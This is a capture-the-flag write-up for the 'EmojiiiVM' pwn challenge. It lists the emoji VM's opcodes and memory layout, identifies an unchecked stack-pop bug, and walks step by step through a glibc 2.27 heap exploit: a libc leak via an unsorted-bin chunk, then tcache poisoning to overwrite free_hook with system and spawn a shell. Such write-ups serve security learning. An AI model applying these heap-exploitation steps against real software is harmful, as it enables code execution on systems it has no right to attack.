# EmojiiiVM (pwn)

## Problem Overcap

VM Pwn!!!  
Let's have a look at the allowed operations, below is a list organized by my teammate Ting

```
Index here is relative to stack_top

🈳  1 : nop
➕  2: stack[-2] += stack[-1]; pop;
➖  3: stack[-2] = stack[-1] - stack[-2]; pop;
❌  4: stack[-2] *= stack[-1]; pop;
❓  5: stack[-2] = stack[-1] % stack[-2]; pop;
❎  6: stack[-2] ^= stack[-1]; pop;
👫  7: stack[-2] &= stack[-1]; pop;
💀  8: stack[-2] = stack[-1] < stack[-2]; pop
💯  9: stack[-2] = stack[-1] == stack[-2]; pop
🚀  10: jump stack[-1]; pop;
🈶  11: jump stack[-1]; if (stack[-2] != 0); pop twice;
🈚  12: jump stack[-1]; if (stack[-2] == 0); pop twice;
⏬  13: push operand;
🔝  14: pop if stack not empty;
📤  15: stack[-2] = storage[stack[-1]][stack[-2]]; pop
📥  16: storage[stack[-1]][stack[-2]] = stack[-3]; pop three times;
🆕  17: allocate the first empty storage to (stack[-1]); pop
🆓  18: deallocate storage (stack[-1])
📄  19: read input, and put it to storage[stack[-1]]; pop
📝  20: print storage[stack[-1]]; pop
🔡  21: print and pop stack until encountering null character or empty
🔢  22: print stack[-1]; pop
🛑   23: exit;
```

Also have a look at the allowed operands
```
😀  0
😁  1
😂  2
🤣   3
😜  4
😄  5
😅  6
😆  7
😉  8
😊  9
😍  10
```

The VM memory resides in .bss, and is structured as below, stack entry is of size int64
```
     |       8       |       8       |
0x000|  storage_ptr0 |  storage_ptr1 |
0x010|  storage_ptr2 |  storage_ptr3 |
0x020|  storage_ptr4 |  storage_ptr5 |
0x030|  storage_ptr6 |  storage_ptr7 |
0x040|  storage_ptr8 |  storage_ptr9 |
0x050|     unused    |     usused    |
0x060|             stack             |
                    ...
0x450|             stack             |
```

Storage will be created through new(), each storage consists of one meta chunk and one data chunk, structured as below  
**meta**
```
    |       8       |       8       |
0x00|      size     |    data_ptr   |
```
**data** (size = demanded_size+1, demanded_size<=0x5dc)
```
     |       8       |       8       |
0x000|              data             |
                    ...
0x???|              data             |
```

We are allowed to provide a VM script of size<0x1000 bytes, and can give input to interact with our script  
glibc2.27 is used here  
all protections are enabled

## Exploit

### Vulnerabilty
The main vulnerability here lies in the arthemetic operations. Those operations pop the stack without performing any checks, and this allows us to tamper with the storage pointer stored before stack.  


### Leak libc\_base
Since we can alter heap pointers, let's see what can be done to leak address.  

To leak libc\_base, the most intuitive way is to free a unsorted\_bin\_chunk and leak the pointer, and in libc2.27, this means freeing a chunk of large\_bin size. But actually, due to the indirect reference through meta chunk, leaking the pointer directly would be a little bit harder than dereferencing it and using it to leak pointers in main_arena  

The procedure would be something as below
1. S0 = create(0x500)
	* target chunk
2. (create(0x10))*9
	* pad up storage index
3. delete(S0)
4. delete(S9)
5. S0 = create(0x10)	# replace S0 with original S9 chunk
6. S9 = create(0x10)	# malloc a chunk in the front of target chunk, and in Storage[9], so we can easily manipulate it
7. push 0x40			# offset from S9\_ptr to unsorted\_chunk
8. add*3				# add 0x40 to S9\_ptr
9. (push 0x0)*2			# re-adjust stack\_top to stack\_buffer, so that printing stack won't be truncated
10. push 10				# push a '\n' just for convenience, not necessary
11. (extract S9[0x25-i])*6	# get small\_bin addr onto stack
12. writestack			# print small\_bin address


The heap would look something like this after adding 0x40 to Storage[9]\_ptr
```
     |       8       |       8       |
0x000|               |             21|
0x010|  S9_data_size |  S9_data_ptr  | <- S9 meta data = unmodified S9_ptr
0x020|               |             21|
0x030|               |               | <- S9 data
0x040|               |            4d1|
0x050|unsortedbin_ptr|unsortedbin_ptr| <- unsorted_chunk = modified S9_ptr
```

Now we can easily leak libc\_base through extracting Storage[9] data to stack and printing it


### Create arbitrary write & get shell
The next step would be trying to hijack free\_hook to system so we can get shell. I would like to have an arbitrary malloc here, so the most likely way it to set up freed tcache list and hijack it  


Here is how I merge this trick into the original leaking payload, pay attention to just the difference
1. S0 = create(0x10)	# a chunk close to our target chunk
2. S1 = create(0x500)
3. S(2+i) = create(0x10) for i in range(8)
4. delete(S1)
5. delete(S9)
6. S1 = create(0x10)
7. S9 = create(0x10)
8. push 0x40
9. add*3
10. (push 0x0)*2
11. push 10
12. (extract S9[0x25-i])*6
13. writestack
14. delete(S1)			# delete arbitrary non-critical storage, I'll settle with S1 here
15. delete(S0)			# delete storage located right in front of S9, now *S0->data = S1\_ptr
16. push 0x68			# offset from S0->data to S9\_ptr+0x40
17. (sub)*3				# Now we have S9\_ptr = -(S0->data-0x8)
18. push 0x0
19. sub					# This additional sub negates S9\_ptr, so now S9\_ptr = -(S0->data-0x8), consequently S9->data\_ptr = S1\_ptr
20. read(S9)			# Hijack tcache\_list with free\_hook-0x8
21. (push 0x0)*2		# re-adjust stack\_top to stack\_buffer
22. S0 = create(0x10)	# take out top 2 chunks from tcache
23. S1 = create(0x10)	# now we have S1->data\_ptr = free\_hook-0x8
24. read(S1)			# read argument('/bin/sh') and &system onto free\_hook-0x8
25. delete(S1)			# call system('/bin/sh')

The heap after hijacking tcache\_list looks like this
```
tcache entry 0 -> S0_meta_data -> S0_data -> S1_meta_data -> free_hook-0x8

     |       8       |       8       |
0x000|               |             21|
0x010|  S0_data_ptr  |               | <- freed S0 meta data = tcache entry 0
0x020|               |             21| <- modified S9_ptr
0x030|S1_metadata_ptr|               | <- freed S0 data
                    ...
0x090|unsortedbin_ptr|unsortedbin_ptr| <- unsorted_chunk = unmodified S9_ptr
                    ...
0x???|               |             21|
0x???| free_hook-0x8 |               | <- freed S1 meta data
```

### Writing the payload in EmojiLang
As writing in emoji is confusing and troublesome, I wrote a simple assembler(something similar to asm() func provided by pwntools) to transform readable assembly to EmojiLang, this dramatically increases production speed.  

And as one can easily see, there are a few invalid operation(such as push 0x68) in the instructions above. Making the assembler able to parse those instructions is a harass, so I manually expanded them into valid arthimetic instructions that provide the wanted result

The length limit is large and can be ignored as long as you don't do anything silly and produce large sections of garbage code. I personally didn't spend any time optimizing code length (even sacrificing it for code simplicity), and still met the requirements.
